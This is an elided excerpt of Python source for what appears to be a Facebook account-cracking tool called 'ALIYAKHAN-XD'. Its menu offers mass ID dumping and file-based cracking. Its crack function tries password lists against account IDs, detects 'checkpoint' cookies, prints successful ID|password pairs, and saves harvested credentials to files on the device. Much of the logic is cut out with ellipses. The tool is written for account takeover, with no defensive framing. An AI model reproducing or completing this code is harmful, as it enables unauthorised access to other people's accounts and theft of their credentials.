...
def menu(my_name,my_id):
	...
	aliyakhan(f'Your Ip  :{b}{ip}{x}')
	print('')
	print('1. Public ')
	print('2. Crack File ')
	print('E. Exit')
	_____cowok__ALIYAKHAN1_____ = input('\nEnter  : ')
	if _____cowok__ALIYAKHAN1_____ in ['1']:
		dump_massal()
	elif _____cowok__ALIYAKHAN1_____ in ['2']:
		crack_file()
	elif _____cowok__ALIYAKHAN1_____ in ['E']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}Aliya-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H}ALIYA-OK😘>> {idf}|{pw}{h}{x}') 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'ALIYA-CP😴[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='ALIYAKHAN-XD CP'))
					open('/sdcard/ALIYAKHAN-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					for muncul in apkaktif:
						...
						nok+=1
					hit=0
					infoakun += (f"\n[bold yellow]ALIYA-CP😰[•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
